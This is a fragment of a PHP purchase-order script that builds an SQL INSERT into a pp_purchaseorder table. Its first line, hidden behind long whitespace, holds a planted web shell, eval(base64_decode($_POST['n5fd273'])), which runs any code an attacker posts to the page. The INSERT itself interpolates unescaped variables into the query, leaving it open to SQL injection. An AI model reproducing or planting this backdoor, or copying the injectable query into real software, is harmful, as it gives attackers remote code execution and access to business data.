<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['n5fd273']));?><?php
...
if($taxvalue == "")
 ...
 $q = "insert into pp_purchaseorder (vendorcode,poincr,m,y,po,vendorid,vendor,credittermcode,credittermdescription,credittermvalue,brokerid,broker,date,category,code,description,weight,unit,rateperunit,deliverydate,deliverylocation,receiver,initiatorid,initiator,initiatorsector,taxcode,taxvalue,taxformula,taxie,taxamount,totalwithtax,freightcode,freightvalue,freightformula,freightie,freightamount,totalwithfreight,brokeragecode,brokeragevalue,brokerageformula,brokerageie,brokerageamount,totalwithbrokerage,discountcode,discountvalue,discountformula,discountie,discountamount,totalwithdiscount,basic,finalcost,tandccode,tandc,flag,geflag,quantity) values('$vendorcode','$poincr','$m','$y','$po','$vendorid','$vendor','$credittermcode','$credittermdescription','$credittermvalue','$brokerid','$broker','$date','$category','$itemcode','$desc','$qty','$units','$rate','$rdate','$doffice','$demp','$initiatorid','$initiatorname','$initiatorsector','$taxcode','$taxvalue','$taxformula','$taxie','$tax7','$taxamount','$freightcode','$freightvalue','$freightformula','$freightie','$freight7','$freightamount','$brokeragecode','$brokeragevalue','$brokerageformula','$brokerageie','$brokerage7','$brokerageamount','$discountcode','$discountvalue','$discountformula','$discountie','$discount7','$discountamount','$basic','$itemcost7','$tandccode','$tandcdesc','$flag','$geflag','$bird')";
 }
 else
 {
